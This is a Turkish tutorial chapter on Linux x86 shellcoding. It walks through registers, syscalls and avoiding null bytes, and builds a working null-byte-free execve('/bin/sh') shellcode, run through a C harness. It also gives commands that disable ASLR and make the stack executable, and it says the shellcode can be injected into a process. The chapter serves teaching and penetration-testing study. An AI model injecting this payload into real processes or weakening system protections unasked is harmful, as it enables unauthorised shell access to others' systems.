\newpage
\subsection{8. linux shellcoding örnekleri}

﷽

![linux shellcoding](./images/12/2021-10-11_01-00.png){width="80%"}          

### shellcode

Shellcode yazmak, assembly dili ve bir programın işletim sistemiyle nasıl iletişim kurduğunu öğrenmenin harika bir yoludur.   

Neden biz, Red Team üyeleri ve penetrasyon testçileri, shellcode yazıyoruz?Çünkü gerçek durumlarda shellcode, çalışan bir programa enjekte edilerek, onu tasarlanmadığı bir şeyi yapmaya zorlamak için kullanılabilir. Örneğin, buffer overflow saldırılarında kullanılabilir. Bu nedenle shellcode genellikle bir sömürü (exploit) için "payload" olarak kullanılabilir.    

Neden "shellcode" adı verildi? Tarihi olarak, shellcode, çalıştırıldığında bir shell başlatan makine kodudur.    

### shellcode testi     

Shellcode'u test ederken, onu bir programa yerleştirip çalıştırmak yeterince pratiktir. Aşağıdaki C programı, tüm kodlarımızı test etmek için kullanılacaktır (`run.c`):

```cpp
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "my shellcode here";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1, 
  // so our shellcode worked
  return 1;
}
```

C ve Assembly bilgisi şiddetle tavsiye edilir. Ayrıca, yığın (stack) işleyişini anlamak büyük bir avantajdır. Elbette bu öğreticiden ne anlama geldiklerini öğrenmeye çalışabilirsiniz, ancak bu konuları daha derinlemesine bir kaynaktan öğrenmek için zaman ayırmanız daha iyi olur.    

### ASLR'ı devre dışı bırakma ve etkinleştirme
Address Space Layout Randomization (ASLR), günümüzde çoğu işletim sisteminde kullanılan bir güvenlik özelliğidir. ASLR, süreçlerin adres alanlarını (yığın, heap, kütüphaneler vb.) rastgele düzenler. Bu mekanizma, sömürülerin (exploitation) başarılı olmasını zorlaştırır. Linux'ta ASLR'ı `/proc/sys/kernel/randomize_va_space` arayüzünü kullanarak yapılandırabilirsiniz.    

Desteklenen Değerler:   
* 0 - rastgeleleştirme yok (no randomization)
* 1 - koruyucu rastgeleleştirme (conservative randomization)      
* 2 - tam rastgeleleştirme (full randomization)     

ASLR'ı devre dışı bırakmak için:    

```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

ASLR'ı etkinleştirmek için:   
```bash
echo 2 > /proc/sys/kernel/randomize_va_space 
```

### bazı assembly bilgileri

Öncelikle, biraz daha temel bilgilere tekrar göz atalım. Lütfen sabırlı olun.     

x86 Intel Register Set (Kayıt Seti).     

- EAX, EBX, ECX ve EDX:  
  32-bit genel amaçlı kayıtlardır.  

- AH, BH, CH ve DH:  
  Genel amaçlı kayıtların üst 16-bit'ine erişim sağlar.  

- AL, BL, CL ve DL:  
  Genel amaçlı kayıtların alt 8-bit'ine erişim sağlar.  

Kayıtların İşlevleri  

- EAX, AX, AH ve AL ("Accumulator" Kayıtları):  
  - Giriş/çıkış (I/O) port erişimi.  
  - Aritmetik işlemler.  
  - Kesme (interrupt) çağrıları.  
  - Sistem çağrılarını (system call) uygulamak için kullanılır.  

- EBX, BX, BH ve BL ("Base" Kayıtları):  
  - Bellek erişimi için temel işaretçi (base pointer) olarak kullanılır.  
  - Sistem çağrıları için argümanların saklanacağı işaretçileri tutar.  
  - Bazen bir kesmeden (interrupt) dönen değeri saklamak için kullanılır.  

- ECX, CX, CH ve CL ("Counter" Kayıtları):  
  - Sayaç (counter) işlemleri için kullanılır.  

- EDX, DX, DH ve DL ("Data" Kayıtları):  
  - Giriş/çıkış (I/O) port erişimi.  
  - Aritmetik işlemler.  
  - Bazı kesme çağrılarında kullanılır.  

Bu kayıtlar, assembly dilinde temel sistem çağrıları ve düşük seviyeli işlemleri uygulamak için sıkça kullanılır.

Assembly Talimatları. Assembly programlamada önemli olan bazı talimatlar:      
```nasm
mov eax, 32       ; değer atama, örneğin `eax = 32`.  
xor eax, eax      ; mantıksal Özel Veya (exclusive OR), genellikle bir değeri sıfırlamak için kullanılır.  
push eax          ; yığını (stack) üzerine bir değer koyar.  
pop ebx           ; yığından bir değeri çıkarır ve bir kayda veya değişkene yerleştirir.  
call mysuperfunc  ; bir fonksiyonu çağırır.  
int 0x80          ; kesme (interrupt), genellikle çekirdek (kernel) komutlarını çalıştırır.  
```

Linux Sistem Çağrıları. Sistem çağrıları, kullanıcı alanı (user space) ile çekirdek alanı (kernel space) arasındaki arayüz için kullanılan API'lerdir. Linux sistem çağrılarını assembly programlarınızda kullanabilirsiniz.Bunun için aşağıdaki adımları izleyin:       

Sistem çağrısının numarasını `EAX` kaydına koyun.      
Sistem çağrısının argümanlarını `EBX`, `ECX` vb. kayıtlara saklayın.    
İlgili kesmeyi çağırın (`80h`).     
Sonuç genellikle `EAX` kaydında döndürülür.    

Tüm x86 sistem çağrıları `/usr/include/asm/unistd_32.h` dosyasında listelenmiştir.    

Libc'nin sistem çağrılarını sarmaladığına dair bir örnek:    

```cpp
/*
exit0.c - libc'nin sistem çağrılarını 
nasıl sardığını göstermek için
*/
#include <stdlib.h>

void main() {
  exit(0);
}
```

Kodunuzu derleyin ve ayrıştırın:

```bash
gcc -masm=intel -static -m32 -o exit0 exit0.c
gdb -q ./exit0
```

![linux shellcoding](./images/12/2021-10-11_12-31.png){width="80%"}    

`0xfc = exit_group()` ve `0x1 = exit()`

### nullbytes

Öncelikle, nullbytes'a dikkatinizi çekmek istiyorum.    
Basit bir programı inceleyelim:     

```cpp
/*
meow.c - demonstrate nullbytes
*/
#include <stdio.h>
int main(void) {
    printf ("=^..^= meow \x00 meow");
    return 0;
}
```

derleyelim ve çalıştıralım:

```bash
gcc -m32 -w -o meow meow.c
./meow
```

![meow nullbytes](./images/12/2021-10-11_02-45.png){width="80%"}  

Gördüğünüz gibi, bir nullbyte (`\x00`), talimat zincirini sonlandırır.    

Sömürüler genellikle C kodlarını hedef alır ve bu nedenle shellcode genellikle bir NUL ile sonlandırılmış string olarak teslim edilmelidir.    

Eğer `0xb` numaralı bir sistem çağrısını yapmak istiyorsanız, `EAX` kaydına bu numarayı yerleştirmeniz gerekir. Ancak bunu yaparken makine kodunda nullbyte (`\x00`) içermeyen biçimler kullanmalısınız.   

Şimdi iki eşdeğer kodu derleyip çalıştıralım.     
Önce `exit1.asm`'yi inceleyelim:

```nasm
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o exit1.o exit1.asm
; ld -m elf_i386 -o exit1 exit1.o && ./exit1
; 32-bit linux

section .data

section .bss

section .text
  global _start   ; must be declared for linker

; normal exit
_start:           ; linker entry point
  mov eax, 0      ; zero out eax
  mov eax, 1      ; sys_exit system call
  int 0x80        ; call sys_exit
```

`exit1.asm` kodunun derlenmesi ve incelenmesi:

```bash
nasm -f elf32 -o exit1.o exit1.asm
ld -m elf_i386 -o exit1 exit1.o
./exit1
objdump -M intel -d exit1
```

![exit1 with nullbytes](./images/12/2021-10-11_03-11.png){width="80%"}      

gördüğünüz gibi, makine kodunda nullbyte (`\x00`) bulunuyor.    

İkinci `exit2.asm`:   

```nasm
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o exit2.o exit2.asm
; ld -m elf_i386 -o exit2 exit2.o && ./exit2
; 32-bit linux

section .data

section .bss

section .text
  global _start   ; must be declared for linker

; normal exit
_start:           ; linker entry point
  xor eax, eax    ; zero out eax
  mov al, 1       ; sys_exit system call (mov eax, 1) 
                  ; with remove null bytes
  int 0x80        ; call sys_exit
```

`exit2.asm` derle ve incele:    

```bash
nasm -f elf32 -o exit2.o exit2.asm
ld -m elf_i386 -o exit2 exit2.o
./exit2
objdump -M intel -d exit2
```

![exit2 no nullbytes](./images/12/2021-10-11_03-19.png){width="80%"}      

gördüğünüz gibi, bu kodda gömülü nullbyte (`\x00`) yok.      

Daha önce yazdığım gibi, EAX kaydının AX, AH ve AL bölümleri vardır.     
- AX: EAX'in alt 16 bitine erişir.   
- AL: EAX'in alt 8 bitine erişir.   
- AH: EAX'in üst 8 bitine erişir.   

Peki, bu neden shellcode yazarken önemlidir?Nullbyte'ların neden sorunlu olduğunu hatırlayın. Bir kaydın daha küçük bölümlerini kullanarak, örneğin `mov al, 0x1` ifadesini yazabiliriz ve bu işlem shellcode'da nullbyte üretmez. Eğer `mov eax, 0x1` kullansaydık, bu nullbyte'lar üretirdi.Her iki program da işlevsel olarak eşdeğerdir, ancak biri nullbyte içermez ve bu, shellcode yazımında daha güvenilir bir çözüm sunar. Nullbyte'lardan kaçınmak, shellcode'un eksiksiz bir şekilde çalışmasını sağlar.    

### örnek 1: normal çıkış

En basit örnekle başlayalım. `exit.asm` kodumuzu shellcoding için ilk örnek olarak kullanalım (`example1.asm`):
```nasm
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o example1.o example1.asm
; ld -m elf_i386 -o example1 example1.o && ./example1
; 32-bit linux

section .data

section .bss

section .text
  global _start   ; must be declared for linker

; normal exit
_start:           ; linker entry point
  xor eax, eax    ; zero out eax
  mov al, 1       ; sys_exit system call (mov eax, 1) 
                  ; with remove null bytes
  int 0x80        ; call sys_exit
```

Null byte (`\x00`) üretmemek için `al` ve `XOR` hilesine dikkat edin.    
Bu yöntem, shellcode'da null byte oluşumunu önlemek için kullanılır.   

Byte kodu çıkartma:

```bash
nasm -f elf32 -o example1.o example1.asm
ld -m elf_i386 -o example1 example1.o
objdump -M intel -d example1
```

![example1 shellcode](./images/12/2021-10-11_10-50.png){width="80%"}    

İşte hexadecimal olarak nasıl göründüğü.    

Kullanmamız gereken byte kodları: `31 c0 b0 01 cd 80`. Kodun üst kısmını (`run.c`) aşağıdaki şekilde değiştirin:    

```cpp
/*
run.c - shellcode çalıştırmak için küçük bir iskelet program
*/
// bytecode here
char code[] = "\x31\xc0\xb0\x01\xcd\x80";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1, 
  // so our shellcode worked
  return 1;
}
```

Derleyin ve çalıştırın:    

```bash
gcc -z execstack -m32 -o run run.c
./run
echo $?
```

![example1 shellcode](./images/12/2021-10-11_11-01.png){width="80%"}    

> `-z execstack` bayrağı, yığını yürütülebilir hale getirerek NX (No-eXecute) korumasını devre dışı bırakır. 

Bu, shellcode'un programın yığında çalıştırılmasını sağlar. Programımız `1` yerine `0` döndürdü, bu da shellcode'un başarıyla çalıştığını gösteriyor.     

### örnek 2: linux shell başlatma

Basit bir shell başlatan bir shellcode yazalım (`example2.asm`):       

```nasm
; example2.asm - spawn a linux shell.
; author @cocomelonc
; nasm -f elf32 -o example2.o example2.asm
; ld -m elf_i386 -o example2 example2.o && ./example2
; 32-bit linux

section .data
  msg: db '/bin/sh'

section .bss

section .text
  global _start   ; must be declared for linker

_start:           ; linker entry point

  ; xoring anything with itself clears itself:
  xor eax, eax    ; zero out eax
  xor ebx, ebx    ; zero out ebx
  xor ecx, ecx    ; zero out ecx
  xor edx, edx    ; zero out edx

  mov al, 0xb     ; mov eax, 11: execve
  mov ebx, msg    ; load the string pointer to ebx
  int 0x80        ; syscall

  ; normal exit
  mov al, 1       ; sys_exit system call 
                  ; (mov eax, 1) with remove 
                  ; null bytes
  xor ebx, ebx    ; no errors (mov ebx, 0)
  int 0x80        ; call sys_exit
```

Bu kodu derlemek için bu komutları kullanacağız:     

```bash
nasm -f elf32 -o example2.o example2.asm
ld -m elf_i386 -o example2 example2.o
./example2
```

![example2 shellcode](./images/12/2021-10-11_12-57.png){width="80%"}    

Gördüğünüz gibi, programımız `execve` sistem çağrısını kullanarak bir shell başlattı:

![man execve](./images/12/2021-10-11_13-03.png){width="80%"}    

Not: Evet, `system("/bin/sh")` kullanımı çok daha basit olurdu, değil mi? Ancak, bu yöntem her zaman ayrıcalıkları (privileges) düşürür.

`execve` sistem çağrısı 3 argüman alır:     

* Çalıştırılacak programın yolu - EBX
* Argümanlar veya `argv (null olabilir)` - ECX
* Ortam değişkenleri veya `envp (null olabilir)` - EDX

Bu sefer, null byte üretmeden, değişkenleri yığında saklayarak kod yazacağız (`example3.asm`):

```nasm
; run /bin/sh and normal exit
; author @cocomelonc
; nasm -f elf32 -o example3.o example3.asm
; ld -m elf_i386 -o example3 example3.o && ./example3
; 32-bit linux

section .bss

section .text
  global _start   ; must be declared for linker

_start:           ; linker entry point

  ; xoring anything with itself clears itself:
  xor eax, eax    ; zero out eax
  xor ebx, ebx    ; zero out ebx
  xor ecx, ecx    ; zero out ecx
  xor edx, edx    ; zero out edx

  push eax        ; string terminator
  push 0x68732f6e ; "hs/n"
  push 0x69622f2f ; "ib//"
  mov ebx, esp    ; "//bin/sh",0 pointer is ESP
  mov al, 0xb     ; mov eax, 11: execve
  int 0x80        ; syscall

```

Aşağıdaki adımları izleyerek kodun düzgün çalışıp çalışmadığını ve null byte içerip içermediğini kontrol edebilirsiniz:     

```bash
nasm -f elf32 -o example3.o example3.asm
ld -m elf_i386 -o example3 example3.o
./example3
objdump -M intel -d example3
```

![execve shellcode 2](./images/12/2021-10-11_13-30.png){width="80%"}    

Sonra, `bash` ve `objdump` kullanarak shellcode'un byte kodlarını çıkartabilirsiniz:

```bash
objdump -d ./example3|grep '[0-9a-f]:'|grep -v 'file'|cut \
-f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '| \
sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s | \
sed 's/^/"/'|sed 's/$/"/g'
```

![execve shellcode 2.1](./images/12/2021-10-11_13-35.png){width="80%"}    

Bizim shellcode'ımız böyle olacak:    

```cpp
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e
\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
\xe3\xb0\x0b\xcd\x80"
```

Sonra,yukarıdaki kodu (`run.c`) bunla değiştirelim:

```cpp
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31"
"\xd2\x50\x68\x6e\x2f\x73\x68\x68"
"\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1,
  // so our shellcode worked
  return 1;
}
```

Derleyelim ve çalıştıralım:     
```bash
gcc -z execstack -m32 -o run run.c
./run
```

![shellcode example3 check](./images/12/2021-10-11_13-51.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel çalışıyor. Artık bu shellcode'u kullanabilir ve bir sürece enjekte edebilirsiniz.     

Sonraki bölümde, bir reverse TCP shellcode oluşturacağım. 

[The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)              
[Shellcoding in Linux by exploit-db](https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf)              
[my intro to x86 assembly](https://cocomelonc.github.io/tutorial/2021/10/03/malware-analysis-1.html)          
[my nasm tutorial](https://cocomelonc.github.io/tutorial/2021/10/08/malware-analysis-2.html)           
[execve](https://man7.org/linux/man-pages/man2/execve.2.html)         
[Github’taki kaynak kod:](https://github.com/cocomelonc/2021-10-09-linux-shellcoding-1)         
